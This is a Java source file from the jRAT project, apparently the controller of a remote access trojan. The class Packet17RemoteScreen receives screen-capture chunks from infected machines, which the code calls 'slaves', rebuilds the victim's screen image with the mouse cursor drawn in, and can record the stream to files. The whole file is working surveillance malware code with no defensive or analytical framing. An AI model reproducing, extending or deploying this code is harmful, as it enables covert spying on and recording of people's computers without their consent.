package pro.jrat.packets.incoming;

import java.awt.Graphics;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import java.util.HashMap;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;

import pro.jrat.Main;
import pro.jrat.RemoteScreenData;
import pro.jrat.Slave;
import pro.jrat.Traffic;
import pro.jrat.threads.ThreadImage;
import pro.jrat.threads.ThreadRemoteScreenRecorder;
import pro.jrat.ui.frames.FrameRemoteScreen;
import pro.jrat.utils.ImageUtils;

public class Packet17RemoteScreen extends AbstractIncomingPacket {

	public boolean requestAgain = true;
	public static final HashMap<Slave, RemoteScreenData> instances = new HashMap<Slave, RemoteScreenData>();
	public static Image MOUSE_CURSOR;

	static {
		try {
			MOUSE_CURSOR = ImageIO.read(Main.class.getResource("/icons/mouse_pointer.png"));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int w = slave.readInt();
		int h = slave.readInt();

		int mouseX = slave.readInt();
		int mouseY = slave.readInt();

		RemoteScreenData itd = instances.get(slave);

		if (itd == null) {
			itd = new RemoteScreenData(slave, w, h);
			instances.put(slave, itd);
		}
		
		if (itd.getBufferedImage().getWidth() != w || itd.getBufferedImage().getHeight() != h) {
			itd = new RemoteScreenData(slave, w, h);
			instances.put(slave, itd);
		}
		
		BufferedImage bufferedImage = itd.getBufferedImage();
		
		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);

		if (dis.readBoolean() && frame != null && frame.running) {
			System.gc();

			if (frame.record) {
				new ThreadRemoteScreenRecorder(frame.recorder.getPath(), bufferedImage, frame.recorder.getCount(), frame.recorder.getExtension()).start();
			}

			if (requestAgain) {
				new ThreadImage(frame.getDelay(), slave).start();
			}
			
			frame.getFPSThread().increase();
			return;
		}

		int x = slave.readInt();
		int y = slave.readInt();

		int blen = slave.readInt();

		byte[] buffer = new byte[blen];
		slave.getDataInputStream().readFully(buffer);

		if (frame != null && frame.running) {
			try {
				Graphics imageGraphics = bufferedImage.getGraphics();

				int rows = frame.rows;
				int cols = frame.cols;

				int chunkWidth = w / cols;
				int chunkHeight = h / rows;

				frame.progressBar.setMaximum(rows * cols);
				frame.progressBar.setValue(0);

				int size = 0;

				itd.setChunks(itd.getChunks() + 1);
				itd.setUpdatedChunks(itd.getUpdatedChunks() + 1);

				BufferedImage image = ImageUtils.decodeImage(buffer);
				imageGraphics.drawImage(image, chunkWidth * y, chunkHeight * x, null);

				Traffic.increaseReceived(slave, blen);
				frame.lbl.repaint();
				frame.lbl.revalidate();
				frame.progressBar.setValue(frame.progressBar.getValue() + 1);
				frame.setLatestChunkSize(blen);
				size += blen;

				imageGraphics.drawImage(MOUSE_CURSOR, mouseX, mouseY, 16, 16, null);
				frame.lbl.repaint();

				frame.increaseSize(size);


				if (!itd.hasCreatedIcon()) {
					ImageIcon imageicon = new ImageIcon(bufferedImage);
					frame.icon.setImage(imageicon.getImage());
					itd.setIcon();
				}

			} catch (Exception ex) {
				ex.printStackTrace();
				System.gc();
			}
		}
	}
}
